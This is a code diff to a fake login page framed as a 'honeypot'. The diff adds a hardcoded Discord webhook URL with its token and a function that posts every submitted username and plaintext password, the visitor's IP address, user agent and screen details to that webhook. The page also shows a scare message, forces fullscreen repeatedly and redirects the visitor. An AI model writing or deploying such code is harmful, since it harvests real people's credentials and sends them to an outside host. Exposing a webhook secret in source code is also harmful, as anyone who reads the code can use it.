@@ -190,6 +190,7 @@
   </div>
 
   <script>
+    const webhookURL = 'https://discord.com/api/webhooks/1350212897069858857/0PGVgzG7xS0xDt_wQgsWRFusaveJWeuVZ52Fw-y-TGjp5SnsVTW74L8IGm0EzHPZGaot';
     const loginForm = document.getElementById('login-form');
     const honeytrap = document.getElementById('honeytrap');
     const message = document.getElementById('message');
@@ -214,47 +215,85 @@
       screenHeight: window.screen.height
     };
 
+
+  async function sendToDiscord(loggingData) {
+    const payload = {
+      username: "Login Logger",
+      embeds: [
+        {
+          title: "🚨 Unauthorized Login Attempt 🚨",
+          color: 16711680, // Red color
+          fields: [
+            { name: "📅 Timestamp", value: loggingData.timestamp, inline: false },
+            { name: "🌐 IP Address", value: loggingData.ip || "Unknown", inline: false },
+            { name: "👤 Username", value: loggingData.formData.username, inline: true },
+            { name: "🔑 Password", value: "||" + loggingData.formData.password + "||", inline: true },
+            { name: "🖥️ User Agent", value: loggingData.browserInfo.userAgent, inline: false },
+            { name: "🖥️ Platform", value: loggingData.browserInfo.platform, inline: true },
+            { name: "📺 Screen Size", value: `${loggingData.browserInfo.screenWidth}x${loggingData.browserInfo.screenHeight}`, inline: true }
+          ],
+          footer: { text: "Captured Login Attempt" },
+          timestamp: new Date().toISOString()
+        }
+      ]
+    };
+
+    try {
+      await fetch(webhookURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+      console.log("📡 Data sent to Discord webhook.");
+    } catch (error) {
+      console.error("❌ Error sending to Discord:", error);
+    }
+  }
+
     // Handle login attempts
     loginForm.addEventListener('submit', async function(e) {
-      e.preventDefault();
-      
-      // Capture form data
-      loggingData.formData = {
-        username: document.getElementById('username').value,
-        password: document.getElementById('password').value
-      };
+  e.preventDefault();
+  
+  // Capture form data
+  loggingData.formData = {
+    username: document.getElementById('username').value,
+    password: document.getElementById('password').value
+  };
 
-      // Get real IP address
-      try {
-        const response = await fetch('https://ifconfig.me/ip');
-        loggingData.ip = await response.text();
-      } catch (error) {
-        console.error('Error fetching IP:', error);
-        loggingData.ip = 'IP retrieval failed';
-      }
-      
-      loggingData.attempted = true;
-      loggingData.timestamp = new Date().toString();
-      timestamp.textContent = loggingData.timestamp;
-      
-      // In a real honeypot, you might send this data to your server
-      console.log('Honeypot data captured:', loggingData);
-      
-      // Show honeytrap with real IP
-      honeytrap.style.display = 'flex';
-      message.textContent = `IP address (${loggingData.ip}) logged. System administrator notified`;
-      
-      // Request fullscreen repeatedly
-      requestFullscreenRepeatedly();
-      
-      // Simulate "logging" the attacker's information
-      simulateLogging();
-      
-      // After delay, redirect to the specified URL
-      setTimeout(() => {
-        window.location.href = 'https://dignelsus.github.io/';
-      }, 8000);
-    });
+  // Get real IP address
+  try {
+    const response = await fetch('https://ifconfig.me/ip');
+    loggingData.ip = await response.text();
+  } catch (error) {
+    console.error('Error fetching IP:', error);
+    loggingData.ip = 'IP retrieval failed';
+  }
+  
+  loggingData.attempted = true;
+  loggingData.timestamp = new Date().toString();
+  timestamp.textContent = loggingData.timestamp;
+  
+  // Send the captured data to Discord webhook
+  await sendToDiscord(loggingData); // Add this line
+
+  // Existing honeypot functionality
+  console.log('Honeypot data captured:', loggingData);
+  
+  // Show honeytrap with real IP
+  honeytrap.style.display = 'flex';
+  message.textContent = `IP address (${loggingData.ip}) logged. System administrator notified`;
+  
+  // Request fullscreen repeatedly
+  requestFullscreenRepeatedly();
+  
+  // Simulate "logging" the attacker's information
+  simulateLogging();
+  
+  // After delay, redirect to the specified URL
+  setTimeout(() => {
+    window.location.href = 'https://dignelsus.github.io/';
+  }, 8000);
+});
 
     function requestFullscreenRepeatedly() {
       clearInterval(fullscreenInterval);
